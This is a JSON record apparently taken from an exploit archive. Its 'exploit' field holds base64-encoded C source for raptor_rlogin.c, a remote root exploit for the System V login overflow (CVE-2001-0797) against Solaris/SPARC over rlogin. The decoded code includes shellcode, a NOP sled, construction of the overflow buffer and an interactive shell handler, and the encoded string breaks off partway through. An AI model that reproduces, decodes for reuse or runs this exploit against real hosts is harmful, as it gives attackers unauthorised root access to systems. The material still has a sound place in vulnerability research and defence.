{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqICRJZDogcmFwdG9yX3Jsb2dpbi5jLHYgMS4xIDIwMDQvMTIvMDQgMTQ6NDQ6MzggcmFwdG9yIEV4cCAkDQogKg0KICogcmFwdG9yX3Jsb2dpbi5jIC0gKHIpbG9naW4sIFNvbGFyaXMvU1BBUkMgMi41LjEvMi42LzcvOA0KICogQ29weXJpZ2h0IChjKSAyMDA0IE1hcmNvIEl2YWxkaSA8cmFwdG9yQDB4ZGVhZGJlZWYuaW5mbz4NCiAqDQogKiBCdWZmZXIgb3ZlcmZsb3cgaW4gbG9naW4gaW4gdmFyaW91cyBTeXN0ZW0gViBiYXNlZCBvcGVyYXRpbmcgc3lzdGVtcyANCiAqIGFsbG93cyByZW1vdGUgYXR0YWNrZXJzIHRvIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvbW1hbmRzIHZpYSBhIGxhcmdlIG51bWJlciANCiAqIG9mIGFyZ3VtZW50cyB0aHJvdWdoIHNlcnZpY2VzIHN1Y2ggYXMgdGVsbmV0IGFuZCBybG9naW4gKENWRS0yMDAxLTA3OTcpLg0KICoNCiAqIERlZGljYXRlZCB0byBteSBiZWF1dGlmdWwgY3JvYXRpYW4gbGFkaWVzIChoZWxsbyBacmlua2EhKSAtLSBBdWd1c3QgMjAwNA0KICoNCiAqIFRoaXMgcmVtb3RlIHJvb3QgZXhwbG9pdCB1c2VzIHRoZSAob2xkKSBTeXN0ZW0gViBiYXNlZCAvYmluL2xvZ2luIA0KICogdnVsbmVyYWJpbGl0eSB2aWEgdGhlIHJsb2dpbiBhdHRhY2sgdmVjdG9yLCByZXR1cm5pbmcgaW50byB0aGUgLmJzcyANCiAqIHNlY3Rpb24gdG8gZWZmZWN0aXZlbHkgYnlwYXNzIHRoZSBub24tZXhlY3V0YWJsZSBzdGFjayBwcm90ZWN0aW9uDQogKiAobm9leGVjX3VzZXJfc3RhY2s9MSBpbiAvZXRjL3N5c3RlbSkuDQogKg0KICogTWFueSB0aGFua3MgdG8gc2N1dCA8c2N1dEBuYi5pbi1iZXJsaW4uZGU+ICgwZGQpIGZvciBoaXMgZWxpdGUgcGFtX2hhbmRsZV90DQogKiB0ZWNobmlxdWUgKHNlZSA3MzUwbG9nb3V0LmMpLCBhbHNvIHRoYW5rcyB0byBpbm9kZSA8aW5vZGVAZGVhZGxvY2tzLmluZm8+Lg0KICoNCiAqIFVzYWdlIChtdXN0IGJlIHJvb3QpOg0KICogIyBnY2MgcmFwdG9yX3Jsb2dpbi5jIC1vIHJhcHRvcl9ybG9naW4gLVdhbGwNCiAqIFtvbiBzb2xhcmlzOiBnY2MgcmFwdG9yX3Jsb2dpbi5jIC1vIHJhcHRvcl9ybG9naW4gLVdhbGwgLWx4bmV0XQ0KICogIyAuL3JhcHRvcl9ybG9naW4gLWggMTkyLjE2OC4wLjUwDQogKiBbLi4uXQ0KICogIyBpZDt1bmFtZSAtYTt1cHRpbWU7DQogKiB1aWQ9MChyb290KSBnaWQ9MChyb290KQ0KICogU3VuT1MgbWVybGlubyA1LjggR2VuZXJpY18xMDg1MjgtMTMgc3VuNHUgc3BhcmMgU1VOVyxVbHRyYS01XzEwDQogKiAgIDc6NDVwbSAgdXAgMTIgZGF5KHMpLCAxODo0MiwgIDEgdXNlciwgIGxvYWQgYXZlcmFnZTogMC4wMCwgMC4wMCwgMC4wMQ0KICogIw0KICoNCiAqIFZ1bG5lcmFibGUgcGxhdGZvcm1zIChTUEFSQyk6DQogKiBTb2xhcmlzIDIuNS4xIHdpdGhvdXQgcGF0Y2ggMTA2MTYwLTAyIFt1bnRlc3RlZF0NCiAqIFNvbGFyaXMgMi42IHdpdGhvdXQgcGF0Y2ggMTA1NjY1LTA0IFt1bnRlc3RlZF0NCiAqIFNvbGFyaXMgNyB3aXRob3V0IHBhdGNoIDExMjMwMC0wMSBbdW50ZXN0ZWRdDQogKiBTb2xhcmlzIDggd2l0aG91dCBwYXRjaCAxMTEwODUtMDIgW3Rlc3RlZF0NCiAqLw0KDQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmdzLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KDQojZGVmaW5lCUlORk8xCSJyYXB0b3JfcmxvZ2luLmMgLSAocilsb2dpbiwgU29sYXJpcy9TUEFSQyAyLjUuMS8yLjYvNy84Ig0KI2RlZmluZQlJTkZPMgkiQ29weXJpZ2h0IChjKSAyMDA0IE1hcmNvIEl2YWxkaSA8cmFwdG9yQDB4ZGVhZGJlZWYuaW5mbz4iDQoNCiNkZWZpbmUJQlVGU0laRQkzMDAwCQkJLy8gbWF4IHNpemUgb2YgdGhlIGV2aWwgYnVmZmVyDQojZGVmaW5lCVJFVEFERFIJMHgyNzE4NAkJCS8vIHJldGFkZHIsIHNob3VsZCBiZSByZWxpYWJsZQ0KI2RlZmluZQlUSU1FT1VUCTEwCQkJLy8gbmV0X3JlYWQoKSBkZWZhdWx0IHRpbWVvdXQNCiNkZWZpbmUJQ01ECSJpZDt1bmFtZSAtYTt1cHRpbWU7XG4iCS8vIGV4ZWN1dGVkIHVwb24gZXhwbG9pdGF0aW9uDQoNCmNoYXIgc2NbXSA9IC8qIFNvbGFyaXMvU1BBUkMgc3BlY2lhbCBzaGVsbGNvZGUgKGNvdXJ0ZXN5IG9mIGlub2RlKSAqLw0KLyogZXhlY3ZlKCkgKyBleGl0KCkgKi8NCiJceDk0XHgxMFx4MjBceDAwXHgyMVx4MGJceGQ4XHg5YVx4YTBceDE0XHgyMVx4NmVceDIzXHgwYlx4Y2JceGRjIg0KIlx4YTJceDE0XHg2M1x4NjhceGQ0XHgyM1x4YmZceGZjXHhlMlx4MjNceGJmXHhmOFx4ZTBceDIzXHhiZlx4ZjQiDQoiXHg5MFx4MjNceGEwXHgwY1x4ZDRceDIzXHhiZlx4ZjBceGQwXHgyM1x4YmZceGVjXHg5Mlx4MjNceGEwXHgxNCINCiJceDgyXHgxMFx4MjBceDNiXHg5MVx4ZDBceDIwXHgwOFx4ODJceDEwXHgyMFx4MDFceDkxXHhkMFx4MjBceDA4IjsNCg0KY2hhciBzcGFyY19ub3BbXSA9IC8qIFNvbGFyaXMvU1BBUkMgc3BlY2lhbCBub3AgKHhvciAlc3AsICVzcCwgJW8wKSAqLw0KIlx4OTBceDFiXHg4MFx4MGUiOw0KDQovKiBwcm90b3R5cGVzICovDQppbnQJZXhwbG9pdF9hZGRjaGFyKHVuc2lnbmVkIGNoYXIgKnd3LCB1bnNpZ25lZCBjaGFyIHdjKTsNCnZvaWQJZmF0YWxlcnIoY2hhciAqZnVuYywgY2hhciAqZXJyb3IsIGludCBmZCk7DQppbnQJbmV0X2Nvbm5lY3QoY2hhciAqaG9zdCwgaW50IHBvcnQsIGludCB0aW1lb3V0KTsNCmludAluZXRfcmVhZChpbnQgZmQsIGNoYXIgKmJ1ZiwgaW50IHNpemUsIGludCB0aW1lb3V0KTsNCmludAluZXRfcmVzb2x2ZShjaGFyICpob3N0KTsNCmludAlzY19jb3B5KHVuc2lnbmVkIGNoYXIgKmJ1ZiwgY2hhciAqc3RyLCBsb25nIGxlbik7DQp2b2lkCXNldF92YWwoY2hhciAqYnVmLCBpbnQgcG9zLCBpbnQgdmFsKTsNCnZvaWQJc2hlbGwoaW50IGZkKTsNCnZvaWQJdXNhZ2UoY2hhciAqcHJvZ25hbWUpOw0KDQovKg0KICogbWFpbigpDQogKi8NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCgljaGFyCWJ1ZltCVUZTSVpFXSwgKnAgPSBidWY7DQoJY2hhcgljLCAqaG9zdCA9IE5VTEwsIHRlcm1bXSA9ICJ2dDEwMC85NjAwIjsNCglpbnQJZmQsIGksIGZvdW5kLCBsZW47DQoJaW50CXRpbWVvdXQgPSBUSU1FT1VULCBkZWJ1ZyA9IDA7DQoNCgkvKiBwcmludCBleHBsb2l0IGluZm9ybWF0aW9uICovDQoJZnByaW50ZihzdGRlcnIsICIlc1xuJXNcblxuIiwgSU5GTzEsIElORk8yKTsNCg0KCS8qIHBhcnNlIGNvbW1hbmQgbGluZSAqLw0KCWlmIChhcmdjIDwgMikNCgkJdXNhZ2UoYXJndlswXSk7DQoNCgl3aGlsZSAoKGMgPSBnZXRvcHQoYXJnYywgYXJndiwgImRoOnQ6IikpICE9IEVPRikNCgkJc3dpdGNoKGMpIHsNCgkJY2FzZSAnaCc6DQoJCQlob3N0ID0gb3B0YXJnOw0KCQkJYnJlYWs7DQoJCWNhc2UgJ3QnOg0KCQkJdGltZW91dCA9IGF0b2kob3B0YXJnKTsNCgkJCWJyZWFrOw0KCQljYXNlICdkJzoNCgkJCWRlYnVnID0gMTsNCgkJCWJyZWFrOw0KCQlkZWZhdWx0Og0KCQkJdXNhZ2UoYXJndlswXSk7DQoJCX0NCg0KCWlmICghaG9zdCkNCgkJdXNhZ2UoYXJndlswXSk7DQoNCgkvKiBjb25uZWN0IHRvIHRoZSB0YXJnZXQgaG9zdCAqLw0KCWZkID0gbmV0X2Nvbm5lY3QoaG9zdCwgNTEzLCAxMCk7DQoJZnByaW50ZihzdGRlcnIsICIjIGNvbm5lY3RlZCB0byByZW1vdGUgaG9zdDogJXNcbiIsIGhvc3QpOw0KDQoJLyogc2lnbmFsIGhhbmRsaW5nICovDQoJc2lnbmFsKFNJR1BJUEUsIFNJR19JR04pOw0KDQoJLyogYmVnaW4gdGhlIHJsb2dpbiBzZXNzaW9uICovDQoJbWVtc2V0KGJ1ZiwgMCwgc2l6ZW9mKGJ1ZikpOw0KDQoJaWYgKHNlbmQoZmQsIGJ1ZiwgMSwgMCkgPCAwKQ0KCQlmYXRhbGVycigic2VuZCIsIHN0cmVycm9yKGVycm5vKSwgZmQpOw0KDQoJaWYgKG5ldF9yZWFkKGZkLCBidWYsIHNpemVvZihidWYpLCB0aW1lb3V0KSA8IDApDQoJCWZhdGFsZXJyKCJlcnJvciIsICJUaW1lb3V0IHJlYWNoZWQgaW4gcmxvZ2luIHNlc3Npb24iLCBmZCk7DQoNCgkvKiBkdW1teSBybG9naW4gYXV0aGVudGljYXRpb24gKi8NCgltZW1jcHkocCwgImZvbyIsIDMpOwkJLy8gbG9jYWwgbG9naW4gbmFtZQ0KCXAgKz0gNDsNCgltZW1jcHkocCwgImJhciIsIDMpOwkJLy8gcmVtb3RlIGxvZ2luIG5hbWUNCglwICs9IDQ7DQoJbWVtY3B5KHAsIHRlcm0sIHNpemVvZih0ZXJtKSk7CS8vIHRlcm1pbmFsIHR5cGUNCglwICs9IHNpemVvZih0ZXJtKTsNCg0KCWZwcmludGYoc3RkZXJyLCAiIyBwZXJmb3JtaW5nIGR1bW15IHJsb2dpbiBhdXRoZW50aWNhdGlvblxuIik7DQoJaWYgKHNlbmQoZmQsIGJ1ZiwgcCAtIGJ1ZiwgMCkgPCAwKQ0KCQlmYXRhbGVycigic2VuZCIsIHN0cmVycm9yKGVycm5vKSwgZmQpOw0KDQoJLyogd2FpdCBmb3IgcGFzc3dvcmQgcHJvbXB0ICovDQoJZm91bmQgPSAwOw0KCW1lbXNldChidWYsIDAsIHNpemVvZihidWYpKTsNCg0KCXdoaWxlIChuZXRfcmVhZChmZCwgYnVmLCBzaXplb2YoYnVmKSwgdGltZW91dCkpIHsNCgkJaWYgKHN0cnN0cihidWYsICJhc3N3b3JkOiAiKSAhPSBOVUxMKSB7DQoJCQlmb3VuZCA9IDE7DQoJCQlicmVhazsNCgkJfQ0KCQltZW1zZXQoYnVmLCAwLCBzaXplb2YoYnVmKSk7DQoJfQ0KDQoJaWYgKCFmb3VuZCkNCgkJZmF0YWxlcnIoImVycm9yIiwgIlRpbWVvdXQgd2FpdGluZyBmb3IgcGFzc3dvcmQgcHJvbXB0IiwgZmQpOw0KDQoJLyogc2VuZCBhIGR1bW15IHBhc3N3b3JkICovDQoJaWYgKHNlbmQoZmQsICJwYXNzXG4iLCA1LCAwKSA8IDApDQoJCWZhdGFsZXJyKCJzZW5kIiwgc3RyZXJyb3IoZXJybm8pLCBmZCk7DQoNCgkvKiB3YWl0IGZvciBsb2dpbiBwcm9tcHQgKi8NCglmb3VuZCA9IDA7DQoJbWVtc2V0KGJ1ZiwgMCwgc2l6ZW9mKGJ1ZikpOw0KDQoJZnByaW50ZihzdGRlcnIsICIjIHdhaXRpbmcgZm9yIGxvZ2luIHByb21wdFxuIik7DQoJd2hpbGUgKG5ldF9yZWFkKGZkLCBidWYsIHNpemVvZihidWYpLCB0aW1lb3V0KSkgew0KCQlpZiAoc3Ryc3RyKGJ1ZiwgIm9naW46ICIpICE9IE5VTEwpIHsNCgkJCWZvdW5kID0gMTsNCgkJCWJyZWFrOw0KCQl9DQoJCW1lbXNldChidWYsIDAsIHNpemVvZihidWYpKTsNCgl9DQoNCglpZiAoIWZvdW5kKQ0KCQlmYXRhbGVycigiZXJyb3IiLCAiVGltZW91dCB3YWl0aW5nIGZvciBsb2dpbiBwcm9tcHQiLCBmZCk7DQoNCglmcHJpbnRmKHN0ZGVyciwgIiMgcmV0dXJuaW5nIGludG8gMHglMDh4XG4iLCBSRVRBRERSKTsNCg0KCS8qIGZvciBkZWJ1Z2dpbmcgcHVycG9zZXMgKi8NCglpZiAoZGVidWcpIHsNCgkJcHJpbnRmKCIjIGRlYnVnOiBwcmVzcyBlbnRlciB0byBjb250aW51ZSIpOw0KCQlzY2FuZigiJWMiLCAmYyk7DQoJfQ0KDQoJLyogcHJlcGFyZSB0aGUgZXZpbCBidWZmZXIgKi8NCgltZW1zZXQoYnVmLCAwLCBzaXplb2YoYnVmKSk7DQoJcCA9IGJ1ZjsNCg0KCS8qIGxvZ2luIG5hbWUgKi8NCgltZW1jcHkocCwgImZvbyAiLCA0KTsNCglwICs9IDQ7DQoNCgkvKiByZXR1cm4gYWRkcmVzcyAoZW52KSAqLw0KCXNldF92YWwocCwgMCwgUkVUQUREUik7DQoJcCArPSA0Ow0KCW1lbWNweShwLCAiICIsIDEpOw0KCXArKzsNCg0KCS8qIHRyaWdnZXIgdGhlIG92ZXJmbG93IChlbnYpICovDQoJZm9yIChpID0gMDsgaSA8IDYwOyBpKyssIHAgKz0gMikNCgkJbWVtY3B5KHAsICJhICIsIDIpOw0KDQoJLyogcGFkZGluZyAqLw0KCW1lbWNweShwLCAiIEJCQiIsIDQpOw0KCXAgKz0gNDsNCg0KCS8qIG5vcCBzbGVkIGFuZCBzaGVsbGNvZGUgKi8NCglmb3IgKGkgPSAwOyBpIDwgMzk4OyBpKyssIHAgKz0gNCkNCgkJbWVtY3B5KHAsIHNwYXJjX25vcCwgNCk7DQoJcCArPSBzY19jb3B5KHAsIHNjLCBzaXplb2Yoc2MpIC0gMSk7DQoNCgkvKiBwYWRkaW5nICovDQoJbWVtY3B5KHAsICJCQkIgIiwgNCk7DQoJcCArPSA0Ow0KDQoJLyogcGFtX2hhbmRsZV90OiBtaW5pbWFsIGhlYWRlciAqLw0KCW1lbWNweShwLCAiQ0NDQ0NDQ0NDQ0NDQ0NDQyIsIDE2KTsNCglwICs9IDE2Ow0KCXNldF92YWwocCwgMCwgUkVUQUREUik7CS8vIG11c3QgYmUgYSB2YWxpZCBhZGRyZXNzDQoJcCArPSA0Ow0KCXNldF92YWwocCwgMCwgMHgwMSk7DQoJcCArPSA0Ow0KDQoJLyogcGFtX2hhbmRsZV90OiBOVUxMIHBhZGRpbmcgKi8NCglmb3IgKGkgPSAwOyBpIDwgNTI7IGkrKywgcCArPSA0KQ0KCQlzZXRfdmFsKHAsIDAsIDB4MDApOw0KDQoJLyogcGFtX2hhbmRsZV90OiBwYW1lcHRyIG11c3QgYmUgdGhlIDY1dGggcHRyICovDQoJbWVtY3B5KHAsICJceDAwXHgwMFx4MDAgQUFBQVxuIiwgOSk7DQoJcCArPSA5Ow0KDQoJLyogc2VuZCB0aGUgZXZpbCBidWZmZXIsIDI1NiBjaGFycyBhIHRpbWUgKi8NCglsZW4gPSBwIC0gYnVmOw0KCXAgPSBidWY7DQoJd2hpbGUgKGxlbiA+IDApIHsNCgkJZnByaW50ZihzdGRlcnIsICIjIik7DQoJCWkgPSBsZW4gPiAweDEwMCA/IDB4MTAwIDogbGVuOw0KCQlzZW5kKGZkLCBwLCBpLCAwKTsNCgkJbGVuIC09IGk7DQoJCXAgKz0gaTsNCgkJaWYgKGxlbikNCgkJCXNlbmQoZmQsICJceDA0IiwgMSwgMCk7DQoJCXVzbGVlcCg1MDAwMDApOw0KCX0NCglmcHJpbnRmKHN0ZGVyciwgIlxuIik7DQoJDQoJLyogd2FpdCBmb3IgcGFzc3dvcmQgcHJvbXB0ICovDQoJZm91bmQgPSAwOw0KCW1lbXNldChidWYsIDAsIHNpemVvZihidWYpKTsNCg0KCWZwcmludGYoc3RkZXJyLCAiIyBldmlsIGJ1ZmZlciBzZW50LCB3YWl0aW5nIGZvciBwYXNzd29yZCBwcm9tcHRcbiIpOw0KCXdoaWxlIChuZXRfcmVhZChmZCwgYnVmLCBzaXplb2YoYnVmKSwgdGltZW91dCkpIHsNCgkJaWYgKHN0cnN0cihidWYsICJhc3N3b3JkOiAiKSAhPSBOVUxMKSB7DQoJCQlmb3VuZCA9IDE7DQoJCQlicmVhazsNCgkJfQ0KCQltZW1zZXQoYnVmLCAwLCBzaXplb2YoYnVmKSk7DQoJfQ0KDQoJaWYgKCFmb3VuZCkNCgkJZmF0YWxlcnIoImVycm9yIiwgIk1vc3QgbGlrZWx5IG5vdCB2dWxuZXJhYmxlIiwgZmQpOw0KDQoJZnByaW50ZihzdGRlcnIsICIjIHBhc3N3b3JkIHByb21wdCByZWNlaXZlZCwgd2FpdGluZyBmb3Igc2hlbGxcbiIpOw0KDQoJaWYgKHNlbmQoZmQsICJwYXNzXG4iLCA1LCAwKSA8IDApDQoJCWZhdGFsZXJyKCJzZW5kIiwgc3RyZXJyb3IoZXJybm8pLCBmZCk7DQoNCgkvKiB3YWl0IGZvciBzaGVsbCBwcm9tcHQgKi8NCgltZW1zZXQoYnVmLCAwLCBzaXplb2YoYnVmKSk7DQoJZm91bmQgPSAwOw0KDQoJd2hpbGUgKG5ldF9yZWFkKGZkLCBidWYsIHNpemVvZihidWYpLCB0aW1lb3V0KSkgew0KCQlpZiAoc3Ryc3RyKGJ1ZiwgIiMgIikgIT0gTlVMTCkgew0KCQkJZm91bmQgPSAxOw0KCQkJYnJlYWs7DQoJCX0NCgkJbWVtc2V0KGJ1ZiwgMCwgc2l6ZW9mKGJ1ZikpOw0KCX0NCg0KCWlmICghZm91bmQpDQoJCWZhdGFsZXJyKCJlcnJvciIsICJNb3N0IGxpa2VseSBub3QgdnVsbmVyYWJsZSIsIGZkKTsNCg0KCS8qIGNvbm5lY3QgdG8gdGhlIHJlbW90ZSBzaGVsbCAqLw0KCWZwcmludGYoc3RkZXJyLCAiIyBzaGVsbCBwcm9tcHQgZGV0ZWN0ZWQsIHN1Y2Nlc3NmdWwgZXhwbG9pdGF0aW9uXG5cbiIpOw0KCXNoZWxsKGZkKTsNCg0KCWV4aXQoMCk7DQp9DQoNCi8qDQogKiBleHBsb2l0X2FkZGNoYXIoKTogY2hhciB0cmFuc2xhdGlvbiBmb3IgcGFtIChyaXBwZWQgZnJvbSBzY3V0KQ0KICovDQppbnQgZXhwbG9pdF9hZGRjaGFyKHVuc2lnbmVkIGNoYXIgKnd3LCB1bnNpZ25lZCBjaGFyIHdjKQ0Kew0KCXVuc2lnbmVkIGNoYXIgKiB3d28gPSB3dzsNCg0KCXN3aXRjaCAod2MpIHsNCgljYXNlICgnXFwnKToNCgkJKnd3KysgPSAnXFwnOw0KCQkqd3crKyA9ICdcXCc7DQoJCWJyZWFrOw0KCWNhc2UgKDB4ZmYpOg0KCWNhc2UgKCdcbicpOg0KCWNhc2UgKCcgJyk6DQoJY2FzZSAoJ1x0Jyk6DQoJCSp3dysrID0gJ1xcJzsNCgkJKnd3KysgPSAoKHdjICYgMDMwMCkgPj4gNikgKyAnMCc7DQoJCSp3dysrID0gKCh3YyAmIDAwNzApID4+IDMpICsgJzAnOw0KCQkqd3crKyA9ICh3YyAmIDAwMDcpICsgJzAnOw0KCQlicmVhazsNCglkZWZhdWx0Og0KCQkqd3crKyA9IHdjOw0KCQlicmVhazsNCgl9DQoNCglyZXR1cm4gKHd3IC0gd3dvKTsNCn0NCg0KLyoNCiAqIGZhdGFsZXJyKCk6IGVycm9yIGhhbmRsaW5nIHJvdXRpbmUNCiAqLw0Kdm9pZCBmYXRhbGVycihjaGFyICpmdW5jLCBjaGFyICplcnJvciwgaW50IGZkKQ0Kew0KCWZwcmludGYoc3RkZXJyLCAiJXM6ICVzXG4iLCBmdW5jLCBlcnJvcik7DQoJY2xvc2UoZmQpOw0KCWV4aXQoMSk7DQp9DQoNCi8qDQogKiBuZXRfY29ubmVjdCgpOiBzaW1wbGUgbmV0d29yayBjb25uZWN0IHdpdGggdGltZW91dA0KICovDQppbnQgbmV0X2Nvbm5lY3QoY2hhciAqaG9zdCwgaW50IHBvcnQsIGludCB0aW1lb3V0KQ0Kew0KCWludAkJCWZkLCBpLCBmbGFncywgc29ja19sZW47DQoJc3RydWN0IHNvY2thZGRyX2luCXNpbjsNCglzdHJ1Y3QgdGltZXZhbAkJdHY7DQoJZmRfc2V0CQkJZmRzOw0KDQoJLyogYWxsb2NhdGUgYSBzb2NrZXQgKi8NCglpZiAoKGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkpIDwgMCkgew0KCQlwZXJyb3IoInNvY2tldCIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCS8qIGJpbmQgYSBwcml2aWxlZ2VkIHBvcnQgKEZJWE1FKSAqLw0KCXNpbi5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCglzaW4uc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQoJZm9yIChpID0gMTAyMzsgaSA+IDA7IGktLSkgew0KCQlzaW4uc2luX3BvcnQgPSBodG9ucyhpKTsNCgkJaWYgKCEoYmluZChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZzaW4sIHNpemVvZihzaW4pKSkpDQoJCQlicmVhazsNCgl9DQoJaWYgKGkgPT0gMCkNCgkJZmF0YWxlcnIoImVycm9yIiwgIkNhbid0IGJpbmQgYSBwcml2aWxlZ2VkIHBvcnQgKG11c3QgYmUgcm9vdCkiLCBmZCk7DQoNCgkvKiByZXNvbHZlIHRoZSBwZWVyIGFkZHJlc3MgKi8NCglzaW4uc2luX3BvcnQgPSBodG9ucyhwb3J0KTsNCglpZiAoIShzaW4uc2luX2FkZHIuc19hZGRyID0gbmV0X3Jlc29sdmUoaG9zdCkpKQ0KCQlmYXRhbGVycigiZXJyb3IiLCAiQ2FuJ3QgcmVzb2x2ZSBob3N0bmFtZSIsIGZkKTsNCg0KCS8qIHNldCBub24tYmxvY2tpbmcgKi8NCglpZiAoKGZsYWdzID0gZmNudGwoZmQsIEZfR0VURkwsIDApKSA8IDApDQoJCWZhdGFsZXJyKCJmY250bCIsIHN0cmVycm9yKGVycm5vKSwgZmQpOw0KCWlmIChmY250bChmZCwgRl9TRVRGTCwgZmxhZ3MgfCBPX05PTkJMT0NLKSA8IDApDQoJCWZhdGFsZXJyKCJmY250bCIsIHN0cmVycm9yKGVycm5vKSwgZmQpOw0KDQoJLyogY29ubmVjdCB0byByZW1vdGUgaG9zdCAqLw0KCWlmICghKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2luLCBzaXplb2Yoc2luKSkpKSB7DQoJCWlmIChmY250bChmZCwgRl9TRVRGTCwgZmxhZ3MpIDwgMCkNCgkJCWZhdGFsZXJyKCJmY250bCIsIHN0cmVycm9yKGVycm5vKSwgZmQpOw0KCQlyZXR1cm4oZmQpOw0KCX0NCglpZiAoZXJybm8gIT0gRUlOUFJPR1JFU1MpDQoJCWZhdGFsZXJyKCJlcnJvciIsICJDYW4ndCBjb25uZWN0IHRvIHJlbW90ZSBob3N0IiwgZmQpOw0KDQoJLyogc2V0IHRpbWVvdXQgKi8NCgl0di50dl9zZWMgPSB0aW1lb3V0Ow0KCXR2LnR2X3VzZWMgPSAwOw0KDQoJLyogc2V0dXAgc2VsZWN0IHN0cnVjdHMgKi8NCglGRF9aRVJPKCZmZHMpOw0KCUZEX1NFVChmZCwgJmZkcyk7DQoNCgkvKiBzZWxlY3QgKi8NCglpZiAoc2VsZWN0KEZEX1NFVFNJWkUsIE5VTEwsICZmZHMsIE5VTEwsICZ0dikgPD0gMCkNCgkJZmF0YWxlcnIoImVycm9yIiwgIkNhbid0IGNvbm5lY3QgdG8gcmVtb3RlIGhvc3QiLCBmZCk7DQoJDQoJLyogY2hlY2sgaWYgY29ubmVjdGVkICovDQoJc29ja19sZW4gPSBzaXplb2Yoc2luKTsNCglpZiAoZ2V0cGVlcm5hbWUoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2luLCAmc29ja19sZW4pIDwgMCkNCgkJZmF0YWxlcnIoImVycm9yIiwgIkNhbid0IGNvbm5lY3QgdG8gcmVtb3RlIGhvc3QiLCBmZCk7DQoJaWYgKGZjbnRsKGZkLCBGX1NFVEZMLCBmbGFncykgPCAwKQ0KCQlmYXRhbGVycigiZmNudGwiLCBzdHJlcnJvcihlcnJubyksIGZkKTsNCglyZXR1cm4oZmQpOw0KfQ0KDQovKg0KICogbmV0X3JlYWQoKTogbm9uLWJsb2NraW5nIHJlYWQgZnJvbSBmZA0KICovDQppbnQgbmV0X3JlYWQoaW50IGZkLCBjaGFyICpidWYsIGludCBzaXplLCBpbnQgdGltZW91dCkNCnsNCglmZF9zZXQJCWZkczsNCglzdHJ1Y3QgdGltZXZhbAl3YWl0Ow0KCWludAkJbiA9IC0xOw0KDQoJLyogc2V0IHRpbWVvdXQgKi8NCgl3YWl0LnR2X3NlYyA9IHRpbWVvdXQ7DQoJd2FpdC50dl91c2VjID0gMDsNCg0KCW1lbXNldChidWYsIDAsIHNpemUpOw0KDQoJRkRfWkVSTygmZmRzKTsNCglGRF9TRVQoZmQsICZmZHMpOw0KDQoJLyogc2VsZWN0IHdpdGggdGltZW91dCAqLw0KCWlmIChzZWxlY3QoRkRfU0VUU0laRSwgJmZkcywgTlVMTCwgTlVMTCwgJndhaXQpIDwgMCkgew0KCQlwZXJyb3IoInNlbGVjdCIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCS8qIHJlYWQgZGF0YSBpZiBhbnkgKi8NCglpZiAoRkRfSVNTRVQoZmQsICZmZHMpKQ0KCQluID0gcmVhZChmZCwgYnVmLCBzaXplKTsNCg0KCXJldHVybiBuOw0KfQ0KDQovKg0KICogbmV0X3Jlc29sdmUoKTogc2ltcGxlIG5ldHdvcmsgcmVzb2x2ZXINCiAqLw0KaW50IG5ldF9yZXNvbHZlKGNoYXIgKmhvc3QpDQp7DQoJc3RydWN0IGluX2FkZHIJYWRkcjsNCglzdHJ1Y3QgaG9zdGVudAkqaGU7DQoNCgltZW1zZXQoJmFkZHIsIDAsIHNpemVvZihhZGRyKSk7DQoNCglpZiAoKGFkZHIuc19hZGRyID0gaW5ldF9hZGRyKGhvc3QpKSA9PSAtMSkgew0KCQlpZiAoIShoZSA9IChzdHJ1Y3QgaG9zdGVudCAqKWdldGhvc3RieW5hbWUoaG9zdCkpKQ0KCQkJcmV0dXJuKDApOw0KCQltZW1jcHkoKGNoYXIgKikmYWRkci5zX2FkZHIsIGhlLT5oX2FkZHIsIGhlLT5oX2xlbmd0aCk7DQoJfQ0KCXJldHVybihhZGRyLnNfYWRkcik7DQp9DQoNCi8qDQogKiBzY19jb3B5KCk6IGNvcHkgdGhlIHNoZWxsY29kZSwgdXNpbmcgZXhwbG9pdF9hZGRjaGFyKCkNCiAqLw0KaW50IHNjX2NvcHkodW5zaWduZWQgY2hhciAqYnVmLCBjaGFyICpzdHIsIGxvbmcgbGVuKQ0Kew0KCXVuc2lnbmVkIGNoYXIJKm9yID0gYnVmOw0KCWludCAJCWk7DQoNCglmb3IoaSA9IDA7IGkgPCBsZW47IGkrKykNCgkJYnVmICs9IGV4cGxvaXRfYWRkY2hhcihidWYsIHN0cltpXSk7DQoNCglyZXR1cm4oYnVmIC0gb3IpOw0KfQ0KDQovKg0KICogc2V0X3ZhbCgpOiBjb3B5IGEgZHdvcmQgaW5zaWRlIGEgYnVmZmVyDQogKi8NCnZvaWQgc2V0X3ZhbChjaGFyICpidWYsIGludCBwb3MsIGludCB2YWwpDQp7DQoJYnVmW3Bvc10gPQkodmFsICYgMHhmZjAwMDAwMCkgPj4gMjQ7DQoJYnVmW3BvcyArIDFdID0JKHZhbCAmIDB4MDBmZjAwMDApID4+IDE2Ow0KCWJ1Zltwb3MgKyAyXSA9CSh2YWwgJiAweDAwMDBmZjAwKSA+PiA4Ow0KCWJ1Zltwb3MgKyAzXSA9CSh2YWwgJiAweDAwMDAwMGZmKTsNCn0NCg0KLyoNCiAqIHNoZWxsKCk6IHNlbWktaW50ZXJhY3RpdmUgc2hlbGwgaGFjaw0KICovDQp2b2lkIHNoZWxsKGlud